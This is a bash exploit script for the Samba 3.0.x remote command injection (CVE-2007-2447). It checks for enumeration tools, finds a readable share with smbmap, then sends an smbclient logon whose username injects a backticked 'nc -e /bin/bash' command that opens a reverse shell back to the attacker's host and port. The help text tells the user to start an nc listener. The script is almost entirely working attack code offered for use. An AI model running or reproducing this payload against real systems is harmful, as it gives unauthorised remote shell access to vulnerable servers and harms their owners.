
#!/bin/bash

#Author : SrMeirins


#           _____           _  _______    _____             _         _
#          / ____|         | ||__   __|  |  __ \           | |       | |
#         | (___  _ __ ___ | |__ | | ___ | |__) |___   ___ | |_   ___| |__
#          \___ \| '_ ` _ \| '_ \| |/ _ \|  _  // _ \ / _ \| __| / __| '_ \
#          ____) | | | | | | |_) | | (_) | | \ \ (_) | (_) | |_ _\__ \ | | |
#         |_____/|_| |_| |_|_.__/|_|\___/|_|  \_\___/ \___/ \__(_)___/_| |_|


#Samba 3.0.0 - 3.0.25rc3 are subject for Remote Command Injection Vulnerability (CVE-2007-2447), allows remote attackers to execute arbitrary commands by specifying a username containing shell meta characters.


#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Functions
trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n\n${redColour}[-] ${endColour}${grayColour}Exiting ...${endColour}${redColour} [-]${endcolour}"; sleep 1
	tput cnorm; exit 1
}

function helpPanel(){

	echo -e "\n${greenColour} USE: ${endColour}${yellowColour} $0 -r <REMOTE_IP> -l <local_host> -p <local_port>${endColour}"
	echo -e "\n${greenColour} REMEMBER TO OPEN WITH NC A LISTENER IN THE PORT YOU GIVE AS LOCAL PORT IN THE SCRIPTS PARAMETERS${endColour}"; tput cnorm; exit 0
}

function checkProg(){
	tput civis; echo -e "\n\n${grayColour} Checking programs...${endColour}"; sleep 1
	for i in enum4linux legion smbclient smbmap; do
		which $i &>/dev/null
		if [ $? -eq 0 ];then
			echo -e "\n${grayColour} $i -------- ${endColour}${yellowColour}[ V ]${endColour}"
		else
			echo -e "\n ${grayColour} Tool $i not found.... Installing ${endColour}\n";sleep 1
			apt install -y $i &>/dev/null
			if [ $? -eq 0 ];then
				echo -e "\n${grayColour} $i -------- ${endColour}${yellowColour}[ V ]${endColour}"
			else
				echo -e "\n${redColour} Error installing ... Exiting (X)${endColour}"; sleep 1; tput cnorm; exit 1
			fi
		fi

	done
}

function checkAccess(){
	echo -e "\n${grayColour} Checking Access ...${endColour}";sleep 2
	smbmap -H $remote_machine | grep READ &>/dev/null
	if [ $? -eq 0 ];then
		folder=$(smbmap -H $remote_machine | grep READ | awk '{print $1}' | head -n 1)
		echo -e "\n${grayColour} All Correct :) ${endColour}"
	else
		echo -e "\n ${redColour}This IP is not reachable or no directories with READ permissions\n${endColour}\n"; sleep 1; tput cnorm; exit 1
	fi
}

function smbexploit(){
	echo -e "\n${yellowColour} Trying to make a connection ...${endColour}"; sleep 1
	echo -e "\n${yellowColour} Remember to set a listener on your machine !!! ${endColour}"; sleep 1
	echo -e "\n${yellowColour} If you have already done ... Good Luck :) ${endColour}"; sleep 1
	echo -e "\n${yellowColour} IMPORTANT!! When the prompt give you the option to put a password, just hit te enter key... See you on the target machine <3 ${endColour}\n\n"; sleep 5
	tput cnorm
	echo ''; bash -c "smbclient //$remote_machine/$folder -N --option="client min protocol=NT1" -c 'logon \"/=\`nohup nc -e /bin/bash $local_host $local_port\`\"'"

}

#Main

if [ "$(echo $UID)" == "0" ]; then
	declare -i p_counter=0; while getopts ":p:l:r:h:" arg; do
		case $arg in
			p) local_port=$OPTARG; let p_counter+=1;;
			l) local_host=$OPTARG; let p_counter+=1;;
			r) remote_machine=$OPTARG; let p_counter+=1;;
			h) helpPanel;;
		esac
	done

	if [ $p_counter -ne 3 ]; then
		helpPanel
	else
		checkProg
		checkAccess
		smbexploit
	fi
else
	echo -e "\n${redColour} [-] You must be Root to run the script [-]${endColour}\n"
fi
